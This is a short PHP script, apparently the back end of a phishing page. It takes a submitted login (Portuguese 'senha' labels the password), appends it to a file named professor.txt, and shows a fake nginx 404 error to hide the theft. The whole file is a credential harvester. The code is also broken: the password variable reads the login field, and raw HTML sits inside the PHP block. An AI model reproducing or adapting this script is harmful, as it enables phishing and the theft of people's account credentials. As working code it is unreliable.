<?php 
$login = $_POST['login'];
$senha = $_POST['login'];

$arquivo = 'professor.txt';
$macete = fopen($arquivo, 'a');

$texto = "LOGIN: $login\nSENHA: $senha\n\n";

fwrite($macete, $texto);
fclose($macete);

<center><h1>404 error</h1><hr><span>nginx error</span></center>
?>
